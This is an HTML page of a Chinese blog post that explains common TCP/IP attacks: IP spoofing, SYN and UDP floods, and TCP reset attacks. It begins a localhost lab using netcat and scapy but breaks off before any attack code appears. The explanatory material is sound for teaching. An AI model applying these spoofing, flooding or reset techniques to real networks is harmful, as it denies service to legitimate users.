@@ -1,0 +1,545 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 5.2.0">
+
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/th.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/th.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+
+<link rel="stylesheet" href="//cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5.15.1/css/all.min.css">
+  <link rel="stylesheet" href="//cdn.jsdelivr.net/npm/animate.css@3.1.1/animate.min.css">
+
+<script class="hexo-configurations">
+    var NexT = window.NexT || {};
+    var CONFIG = {"hostname":"mrliuliu.github.io","root":"/","images":"/images","scheme":"Gemini","version":"8.1.0","sidebar":{"position":"left","display":"post","padding":18,"offset":12},"copycode":false,"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"fadeInDown","post_body":"fadeInDown","coll_header":"fadeInLeft","sidebar":"fadeInUp"}},"prism":false,"i18n":{"placeholder":"搜索...","empty":"没有找到任何搜索结果：${query}","hits_time":"找到 ${hits} 个搜索结果（用时 ${time} 毫秒）","hits":"找到 ${hits} 个搜索结果"}};
+  </script>
+<meta name="description" content="常见的TCP&#x2F;IP攻击">
+<meta property="og:type" content="article">
+<meta property="og:title" content="TCP-IP常见攻击.md">
+<meta property="og:url" content="https://mrliuliu.github.io/2021/04/13/TCP-IP%E5%B8%B8%E8%A7%81%E6%94%BB%E5%87%BB-md/index.html">
+<meta property="og:site_name" content="copy dog">
+<meta property="og:description" content="常见的TCP&#x2F;IP攻击">
+<meta property="og:locale" content="zh_CN">
+<meta property="article:published_time" content="2021-04-13T15:02:54.000Z">
+<meta property="article:modified_time" content="2021-04-14T03:40:22.615Z">
+<meta property="article:author" content="Liu liu">
+<meta property="article:tag" content="network">
+<meta name="twitter:card" content="summary">
+
+
+<link rel="canonical" href="https://mrliuliu.github.io/2021/04/13/TCP-IP%E5%B8%B8%E8%A7%81%E6%94%BB%E5%87%BB-md/">
+
+
+<script class="page-configurations">
+  // https://hexo.io/docs/variables.html
+  CONFIG.page = {
+    sidebar: "",
+    isHome : false,
+    isPost : true,
+    lang   : 'zh-CN'
+  };
+</script>
+<title>TCP-IP常见攻击.md | copy dog</title>
+  
+
+
+
+  <noscript>
+  <style>
+  body { margin-top: 2rem; }
+
+  .use-motion .menu-item,
+  .use-motion .sidebar,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-header {
+    visibility: visible;
+  }
+
+  .use-motion .header,
+  .use-motion .site-brand-container .toggle,
+  .use-motion .footer { opacity: initial; }
+
+  .use-motion .site-title,
+  .use-motion .site-subtitle,
+  .use-motion .custom-logo-image {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line {
+    transform: scaleX(1);
+  }
+
+  .search-pop-overlay, .sidebar-nav { display: none; }
+  .sidebar-panel { display: block; }
+  </style>
+</noscript>
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" class="use-motion">
+  <div class="headband"></div>
+
+  <main class="main">
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏">
+        <span class="toggle-line"></span>
+        <span class="toggle-line"></span>
+        <span class="toggle-line"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <i class="logo-line"></i>
+      <h1 class="site-title">copy dog</h1>
+      <i class="logo-line"></i>
+    </a>
+      <p class="site-subtitle" itemprop="description">和懒惰抗争</p>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger">
+    </div>
+  </div>
+</div>
+
+
+
+<nav class="site-nav">
+  <ul class="main-menu menu">
+        <li class="menu-item menu-item-home"><a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a></li>
+        <li class="menu-item menu-item-archives"><a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档</a></li>
+        <li class="menu-item menu-item-tags"><a href="/tags" rel="section"><i class="fa fa-tag fa-fw"></i>标签</a></li>
+        <li class="menu-item menu-item-categories"><a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>分类</a></li>
+  </ul>
+</nav>
+
+
+
+
+</div>
+        
+  
+  <div class="toggle sidebar-toggle">
+    <span class="toggle-line"></span>
+    <span class="toggle-line"></span>
+    <span class="toggle-line"></span>
+  </div>
+
+  <aside class="sidebar">
+
+    <div class="sidebar-inner sidebar-nav-active sidebar-toc-active">
+      <ul class="sidebar-nav">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <div class="sidebar-panel-container">
+        <!--noindex-->
+        <section class="post-toc-wrap sidebar-panel">
+            <div class="post-toc animated"><ol class="nav"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%85%B3%E4%BA%8ETCP-IP%E5%B8%B8%E8%A7%81%E6%94%BB%E5%87%BB"><span class="nav-number">1.</span> <span class="nav-text">关于TCP&#x2F;IP常见攻击</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#IP%E6%AC%BA%E9%AA%97"><span class="nav-number">1.1.</span> <span class="nav-text">IP欺骗</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#SYN-Flooding"><span class="nav-number">1.2.</span> <span class="nav-text">SYN Flooding</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#UDP-Flooding"><span class="nav-number">2.</span> <span class="nav-text">UDP Flooding</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%A6%82%E4%BD%95%E7%BC%93%E8%A7%A3UDP%E6%B4%AA%E6%B0%B4%E6%94%BB%E5%87%BB"><span class="nav-number">2.1.</span> <span class="nav-text">如何缓解UDP洪水攻击</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#TCP%E9%87%8D%E7%BD%AE%E6%94%BB%E5%87%BB"><span class="nav-number">3.</span> <span class="nav-text">TCP重置攻击</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%A8%A1%E6%8B%9F%E6%94%BB%E5%87%BB"><span class="nav-number">4.</span> <span class="nav-text">模拟攻击</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%BB%BA%E7%AB%8BTCP%E8%BF%9E%E6%8E%A5"><span class="nav-number">4.1.</span> <span class="nav-text">建立TCP连接</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%97%85%E6%8E%A2%E6%B5%81%E9%87%8F"><span class="nav-number">4.2.</span> <span class="nav-text">嗅探流量</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%8F%91%E9%80%81%E4%BC%AA%E9%80%A0%E7%9A%84%E9%87%8D%E7%BD%AE%E6%8A%A5%E6%96%87"><span class="nav-number">4.3.</span> <span class="nav-text">发送伪造的重置报文</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E8%BF%9B%E4%B8%80%E6%AD%A5%E5%AE%9E%E9%AA%8C"><span class="nav-number">4.4.</span> <span class="nav-text">进一步实验</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E4%B8%AD%E9%97%B4%E4%BA%BA%E6%94%BB%E5%87%BB"><span class="nav-number">5.</span> <span class="nav-text">中间人攻击</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E4%BB%80%E4%B9%88%E6%98%AF%E4%B8%AD%E9%97%B4%E4%BA%BA"><span class="nav-number">5.1.</span> <span class="nav-text">什么是中间人</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E4%B8%AD%E9%97%B4%E4%BA%BA%E6%94%BB%E5%87%BB%E5%8E%9F%E7%90%86"><span class="nav-number">5.2.</span> <span class="nav-text">中间人攻击原理</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%A6%82%E6%9E%9C%E7%AC%AC%E4%B8%89%E6%96%B9%E6%9C%BA%E6%9E%84%E5%86%85%E9%83%A8%E4%B8%8D%E4%B8%A5%E6%A0%BC%E6%88%96%E5%AE%B9%E6%98%93%E5%87%BA%E7%8E%B0%E7%BA%B0%E6%BC%8F"><span class="nav-number">5.3.</span> <span class="nav-text">如果第三方机构内部不严格或容易出现纰漏</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%B8%B8%E7%94%A8%E7%9A%84%E6%91%98%E8%A6%81%E7%AE%97%E6%B3%95"><span class="nav-number">5.4.</span> <span class="nav-text">常用的摘要算法</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%87%BA%E7%8E%B0%E5%86%85%E9%AC%BC%E4%BA%86%E6%80%8E%E4%B9%88%E5%8A%9E%EF%BC%9F"><span class="nav-number">5.5.</span> <span class="nav-text">出现内鬼了怎么办？</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E9%82%A3%E5%A6%82%E4%BD%95%E7%A1%AE%E4%BF%9D%E5%91%98%E5%B7%A5%E4%B8%8D%E4%BC%9A%E4%BF%AE%E6%94%B9%E5%90%88%E5%90%8C%E5%91%A2"><span class="nav-number">5.6.</span> <span class="nav-text">那如何确保员工不会修改合同呢</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E9%82%A3%E4%B9%88%E5%91%98%E5%B7%A5%E4%B8%87%E4%B8%80%E5%92%8C%E6%9F%90%E4%B8%AA%E7%94%A8%E6%88%B7%E4%B8%B2%E9%80%9A%E5%A5%BD%E4%BA%86%E5%91%A2"><span class="nav-number">5.7.</span> <span class="nav-text">那么员工万一和某个用户串通好了呢</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E6%95%B0%E5%AD%97%E8%AF%81%E4%B9%A6%E5%92%8C%E7%AD%BE%E5%90%8D"><span class="nav-number">5.8.</span> <span class="nav-text">数字证书和签名</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%AF%B9%E7%A7%B0%E4%B8%8E%E9%9D%9E%E5%AF%B9%E7%A7%B0%E5%8A%A0%E5%AF%86"><span class="nav-number">5.9.</span> <span class="nav-text">对称与非对称加密</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%AF%B9%E7%A7%B0%E5%8A%A0%E5%AF%86"><span class="nav-number">5.10.</span> <span class="nav-text">对称加密</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%B8%B8%E8%A7%81%E7%9A%84%E5%AF%B9%E7%A7%B0%E5%8A%A0%E5%AF%86%E7%AE%97%E6%B3%95"><span class="nav-number">5.11.</span> <span class="nav-text">常见的对称加密算法</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E9%9D%9E%E5%AF%B9%E7%A7%B0%E7%AE%97%E6%B3%95"><span class="nav-number">5.12.</span> <span class="nav-text">非对称算法</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%B8%B8%E8%A7%81%E7%9A%84%E9%9D%9E%E5%AF%B9%E7%A7%B0%E5%8A%A0%E5%AF%86"><span class="nav-number">5.13.</span> <span class="nav-text">常见的非对称加密</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E9%97%AE%E9%A2%98%E8%BF%98%E6%9C%89%EF%BC%8C%E6%AD%A4%E6%97%B6%E5%A6%82%E6%9E%9C-Sum-%E5%90%A6%E8%AE%A4%E7%BB%99%E8%BF%87-Mike-%E7%9A%84%E5%85%AC%E9%92%A5%E5%92%8C%E5%90%88%E5%90%8C%EF%BC%8C%E4%B8%8D%E4%B9%85gg%E4%BA%86"><span class="nav-number">5.14.</span> <span class="nav-text">问题还有，此时如果 Sum 否认给过 Mike 的公钥和合同，不久gg了</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E4%B8%AD%E9%97%B4%E4%BA%BA%E6%94%BB%E5%87%BB%E5%A6%82%E4%BD%95%E9%81%BF%E5%85%8D"><span class="nav-number">5.15.</span> <span class="nav-text">中间人攻击如何避免?</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#DDOS"><span class="nav-number">6.</span> <span class="nav-text">DDOS</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E9%82%A3-DDoS-%E6%94%BB%E5%87%BB%E7%A9%B6%E7%AB%9F%E6%98%AF%E4%BB%80%E4%B9%88%EF%BC%9F"><span class="nav-number">6.1.</span> <span class="nav-text">那 DDoS 攻击究竟是什么？</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#%E4%B8%BE%E4%B8%AA%E4%BE%8B%E5%AD%90"><span class="nav-number">6.1.1.</span> <span class="nav-text">举个例子</span></a></li></ol></li><li class="nav-item nav-level-4"><a class="nav-link" href="#SYN-Flood%E8%BF%9B%E8%A1%8CDDoS%E6%94%BB%E5%87%BB%E7%9A%84%E5%AE%9E%E7%8E%B0%E5%8E%9F%E7%90%86"><span class="nav-number">6.2.</span> <span class="nav-text">SYN Flood进行DDoS攻击的实现原理**</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%A6%82%E4%BD%95%E5%BA%94%E5%AF%B9-DDoS-%E6%94%BB%E5%87%BB%EF%BC%9F"><span class="nav-number">7.</span> <span class="nav-text">如何应对 DDoS 攻击？</span></a></li></ol></div>
+        </section>
+        <!--/noindex-->
+
+        <section class="site-overview-wrap sidebar-panel">
+          <div class="site-author site-overview-item animated" itemprop="author" itemscope itemtype="http://schema.org/Person">
+  <p class="site-author-name" itemprop="name">Liu liu</p>
+  <div class="site-description" itemprop="description"></div>
+</div>
+<div class="site-state-wrap site-overview-item animated">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+          <a href="/archives/">
+        
+          <span class="site-state-item-count">71</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+            <a href="/categories/">
+          
+        <span class="site-state-item-count">29</span>
+        <span class="site-state-item-name">分类</span></a>
+      </div>
+      <div class="site-state-item site-state-tags">
+            <a href="/tags">
+          
+        <span class="site-state-item-count">17</span>
+        <span class="site-state-item-name">标签</span></a>
+      </div>
+  </nav>
+</div>
+
+
+
+        </section>
+      </div>
+    </div>
+  </aside>
+  <div class="sidebar-dimmer"></div>
+
+
+    </header>
+
+    
+  <div class="back-to-top">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
+  <div class="reading-progress-bar"></div>
+
+<noscript>
+  <div class="noscript-warning">Theme NexT works best with JavaScript enabled</div>
+</noscript>
+
+
+    <div class="main-inner post posts-expand">
+
+
+  
+
+
+<div class="post-block">
+  
+  
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="https://mrliuliu.github.io/2021/04/13/TCP-IP%E5%B8%B8%E8%A7%81%E6%94%BB%E5%87%BB-md/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="Liu liu">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="copy dog">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          TCP-IP常见攻击.md
+        </h1>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+  
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">发表于</span>
+
+      <time title="创建时间：2021-04-13 23:02:54" itemprop="dateCreated datePublished" datetime="2021-04-13T23:02:54+08:00">2021-04-13</time>
+    </span>
+      <span class="post-meta-item">
+        <span class="post-meta-item-icon">
+          <i class="far fa-calendar-check"></i>
+        </span>
+        <span class="post-meta-item-text">更新于</span>
+        <time title="修改时间：2021-04-14 11:40:22" itemprop="dateModified" datetime="2021-04-14T11:40:22+08:00">2021-04-14</time>
+      </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-folder"></i>
+      </span>
+      <span class="post-meta-item-text">分类于</span>
+        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+          <a href="/categories/network/" itemprop="url" rel="index"><span itemprop="name">network</span></a>
+        </span>
+          ，
+        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+          <a href="/categories/network/protocol/" itemprop="url" rel="index"><span itemprop="name">protocol</span></a>
+        </span>
+    </span>
+
+  
+    <span class="post-meta-item" title="阅读次数" id="busuanzi_container_page_pv" style="display: none;">
+      <span class="post-meta-item-icon">
+        <i class="eye"></i>
+      </span>
+      <span class="post-meta-item-text">阅读次数：</span>
+      <span id="busuanzi_value_page_pv"></span>
+    </span>
+</div>
+
+            <div class="post-description">常见的TCP/IP攻击</div>
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+        <p>攻击</p>
+<p><a target="_blank" rel="noopener" href="https://mp.weixin.qq.com/s/i66MhEvEhkeOAB4ymLg_3g">https://mp.weixin.qq.com/s/i66MhEvEhkeOAB4ymLg_3g</a></p>
+<h3 id="关于TCP-IP常见攻击"><a href="#关于TCP-IP常见攻击" class="headerlink" title="关于TCP/IP常见攻击"></a>关于TCP/IP常见攻击</h3><p>1、IP欺骗<br>2、SYN Flooding<br>3、UDP Flooding<br>4、TCP重置攻击<br>5、模拟攻击<br>6、中间人攻击<br>7、DDOS</p>
+<h4 id="IP欺骗"><a href="#IP欺骗" class="headerlink" title="IP欺骗"></a>IP欺骗</h4><p>在网络中，所有的设备都会分配一个地址，这个地址彷佛小蓝家的地址【多少号多少室】，这个号就是分配给整个子网的，【室】对应的号码即分配给子网中计算机的，这就是网络中的地址。【号】对应的号码为网络号，【室】对应的号码为主机号。，这个地址的整体就是IP地址。</p>
+<p>通过IP地址，我们就可以知道判断访问对象服务器的位置，通过这个IP地址就可以判断访问对象服务器的位置，从而将消息发送到服务器。一般发送者发出的消息首先经过子网的集线器，转发到最近的路由器，然后根据路由器位置访问下一个路由器的位置，直到终点。</p>
+<p><a href="IP%E6%8A%A5%E6%96%87.png">IP报文.png</a></p>
+<p>IP欺骗技术就是伪造某台主机的IP地址的技术。通过IP地址的伪装使得某台主机能够伪装另外一台主机，而这台主机往往具有某种特权或者被另外的主机所信任。</p>
+<p>假设现在有一个合法用户1.1.1.1已经同服务器建立正常的连接，攻击者构造攻击的TCP数据，伪装自己的IP为1.1.1.1，并向服务器发送一个带有RST位的TCP数据段。服务器收到这样的数据后，认为从1.1.1.1发送的连接有错误，就会清空缓冲区中建立好的连接。</p>
+<p>这时，如果合法用户1.1.1.1再发送合法数据，服务器就已经没有这样的连接了，该用户就必须从新开始建立连接。攻击时，伪造大量的IP地址，向目标发送RST数据，使服务器不对合法用户服务。虽然IP地址欺骗攻击有着相当难度，但我们应该清除的意识到这种攻击非常广泛，入侵往往从这种攻击开始。</p>
+<h4 id="SYN-Flooding"><a href="#SYN-Flooding" class="headerlink" title="SYN Flooding"></a>SYN Flooding</h4><p>拒绝服务攻击（DDOS）从1970年出现直到今天都依然在作祟，并给全球范围内的各大组织带来了不可估量的损失。SYN Flood是互联网上最经典的DDoS攻击方式之一，最早出现在1999年左右，雅虎是当时最著名的受害者。SYN Flood攻击利用了TCP三次握手的缺陷，能够以较小代价使目标服务器无法响应，且难以追查。</p>
+<p>SYN Flood是一种常见的DOS（denial of service拒绝服务）和DDoS（distributed denial of service 分布式拒绝服务）攻击方式。这是一种使用TCP协议缺陷，发送大量的伪造TCP连接请求，使得被攻击方CPU或内存资源耗尽，最终导致被攻击方无法提供正常的服务。</p>
+<p>原理：<br>TCP SYN Flood攻击利用的是TCP的三次握手（SYN -&gt; SYN/ACK -&gt; ACK),假设连接发起方是A，连接接收方是B，即B在某个端口上监听A的连接请求，A首先发送SYN（Synchronization）消息给B，要求B做好接收数据的准备；B收到后返回SYN-ACK（Synchronization-Acknowledgement)消息给A，这个消息的目的有两个：</p>
+<ul>
+<li>向A确认已做好接收数据的准备，</li>
+<li>同时要求A也做好接收数据的准备，此时B已向A确认号接收状态，并等待A的确认，连接处于半开放状态（Half-Open），顾名思义只开了一半；A收到后再次发送ACK（Acknowledgement）消息给B，向B确认也做好了接收数据的准备，至此三次握手完成，连接就建立了。</li>
+</ul>
+<p>最关键的一点在于双方是否都按对方的要求进入了可以接收消息的状态。而这个状态的确认主要是双方要使用的消息序号（SequenceNum)，TCP为保证消息按发送顺序抵达接收方的上层应用，需要用消息序号来标记消息的发送先后顺序的。</p>
+<p>TCP是双工的Duplex连接，同时支持双向通信，也就是双方同时可向对方发送消息，其中SYN和SYN-ACK消息开启了A-&gt;B的单向通道。（B获知了A的序列号）;SYN-ACK和ACK消息开启了B-&gt;A单向通道（A获知了B的序列号）。</p>
+<p>但实际情况是，网络可能不稳定会丢包，使握手消息不能抵达对方，也可能使对方故意不按规矩来，故意延迟或不发送消息。</p>
+<p>假设B通过某TCP端口提供服务，B在收到A的SYN消息时，积极的反馈了SYN-ACK消息，使连接进入半开状态，因为B不确定自己发给A的SYN-ACK消息或A反馈的ACK消息是否会丢在半路，所以会给每个待完成的半开来连接都设一个Timer，如果超过时间还没收到A的ACK消息，则重新发送一次SYN-ACK消息给A，直到重试超过一定次数时才会放弃。<br>B为和A顺利连接，需要分配内核资源维护半开连接，那么当B面临海量的连接A时，SYN-Flood攻击就形成了。攻击方A可以控制肉鸡向B发送大量SYN消息但不响应ACK消息，或者干脆伪造SYN消息中的Source IP使B反馈的SYN-ACK消息石沉大海，导致B被大量注定不能完成的半开连接占据，直到耗尽资源，停止响应正常的连接请求。</p>
+<h3 id="UDP-Flooding"><a href="#UDP-Flooding" class="headerlink" title="UDP Flooding"></a>UDP Flooding</h3><p>UDP洪泛也是一种拒绝服务攻击，将大量的用户数据报协议（UDP)数据包发送到目标服务器，目的是压倒该设备的处理器和响应能力。防火墙保护目标服务器也可能因UDP泛滥而耗尽，从而导致对合法流量的拒绝服务。</p>
+<p>UDP Flood主要通过利用服务器响应发哦是那个到其中一个端口的UDP数据博爱所采取的步骤。在正常情况下，当服务器在特定端口收到UDP数据包时，会经过两个步骤：</p>
+<ul>
+<li>服务器首先检查是否正在运行正在侦听指定端口的请求的程序</li>
+<li>如果没有程序在该端口接收数据包，则服务器使用ICMP（ping）数据包进行响应。以通知发送方目的第不可达。</li>
+</ul>
+<p>假设要联系酒店的小蓝，酒店可复街道电话后先查看房间的列表来去顶小蓝在客房内，随后转接给小蓝。<br>首先，接待员接收到呼叫着要求连接到特定房间的电话。接待员需要查看所有房间的清单，以确保客人再房间中可用，并愿意接听电话。碰巧的是，此时如果所有的电话线哦那个是亮起来，那么他们就会很快变得不堪重负了。</p>
+<p>当服务器接收到每个新的UDP数据包时，它将通过步骤来处理请求，并利用该过程中的服务器资源。发送UDP报文时，每个报文将包含原设备的IP地址。在这种类型的DDoS攻击期间，攻击者通常不会使用自己的真实IP地址，而是会欺骗IDP数据包的源IP地址，从而阻止攻击者的真是位置被暴漏并潜在的饱和来自目标的响应数据包服务器。</p>
+<p>由于目标服务器利用资源检查并响应每个接收到的UDP数据包的结果，当接收到大量UDP数据包时，目标的资源可能会迅速耗尽，导致对正常流量的拒绝服务。</p>
+<h4 id="如何缓解UDP洪水攻击"><a href="#如何缓解UDP洪水攻击" class="headerlink" title="如何缓解UDP洪水攻击"></a>如何缓解UDP洪水攻击</h4><p>大多数操作系统部分限制了ICMP报文的响应速度，以中断需要ICMP响应的DDoS攻击。这种环节的一个缺点是在攻击过程中，合法的数据包也可能被过滤。如果UDP Flood的容量足够高以使目标服务器的防火墙状态表饱和，则在服务器级别发生的任何缓解都将不足以应对目标设备上游的瓶颈。</p>
+<h3 id="TCP重置攻击"><a href="#TCP重置攻击" class="headerlink" title="TCP重置攻击"></a>TCP重置攻击</h3><p>在TCP重置攻击中，攻击者通过通信的一方或双方发送伪造的消息，告诉他们立即断开连接，从而使通信双方连接中断。在正常情况下，如果客户端发现到达的报文对于相关连接而言是不正确的，TCP就会发送一个重置报文段，从而导致TCP连接的快速拆解。</p>
+<p>TCP重置攻击利用这一机制，通过向通信方发送伪造的重置报文段，欺骗通信双方提前关闭TCP连接。如果伪造的重置报文段完全逼真，接收者就会认为它有效，并关闭TCP连接，防止连接被用来进一步交换信息。服务端可以创建一个新的TCP连接来恢复通信，但仍然可能会被攻击者重置连接。万幸的是，攻击者需要一定的时间来组装和发送伪造的报文，所以一般情况下这种攻击只对长连接有杀伤力，对于短链接而言，还没有开始攻击，人家已经完成了信息交换。</p>
+<p>从某种意义上来说，伪造TCP报文段是很容易的，因为TCP/IP都没有任何内置的方法来验证服务端的身份。有些特殊的IP扩展协议（例如IPSec）确实可以验证身份，但并没有被广泛使用。客户端只能接收报文段，并在可能的情况下使用更高级别的协议（如 TLS）来验证服务端的身份。但这个方法对TCP重置包并不适用，因为TCP重置包是TCP协议本身的一部分，无法使用更高级别的协议进行验证。</p>
+<h3 id="模拟攻击"><a href="#模拟攻击" class="headerlink" title="模拟攻击"></a>模拟攻击</h3><p>伪造一个TCP重置报文需要做哪些事情：</p>
+<ul>
+<li>嗅探通信双方的交换信息。</li>
+<li>截获一个ACK标志位置位1的报文段，并读取其ACK号。</li>
+<li>伪造一个TCP重置报文段（RST 标志位置为1），在其序列号等于上面截获的报文的ACK号。这只是理想情况下的方案，假设信息交换的速度不是很快。大多数情况下为了增加成功率，可以连续发送序列号不同的重置报文。</li>
+<li>将伪造的重置报文发送给通信的一方或双方，使其终止连接。</li>
+</ul>
+<p>我们可以使用本地计算机通过localhost与自己通信，然后对自己进行TCP重置攻击。需要以下几个步骤：</p>
+<ul>
+<li>在两个终端之间建立一个TCP连接。</li>
+<li>编写一个能嗅探通信双方数据的攻击程序。</li>
+<li>修改攻击程序，伪造并发送重置报文。</li>
+</ul>
+<h4 id="建立TCP连接"><a href="#建立TCP连接" class="headerlink" title="建立TCP连接"></a>建立TCP连接</h4><p>可以使用<code>netcat</code>工具来建立TCP连接。</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -nvl 8000</span><br></pre></td></tr></table></figure>
+
+<p>然后打开第二个终端窗口，运行一下命令：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc 127.0.0.1 8000</span><br></pre></td></tr></table></figure>
+
+<p>该命令尝试与上面的服务建立连接，在一端输入另一端就会接收到。</p>
+<h4 id="嗅探流量"><a href="#嗅探流量" class="headerlink" title="嗅探流量"></a>嗅探流量</h4><p>编写一个攻击程序，使用Python网络库<code>scapy</code>来读取两个终端窗口之间交换的数据，并将其打印到终端上。</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span 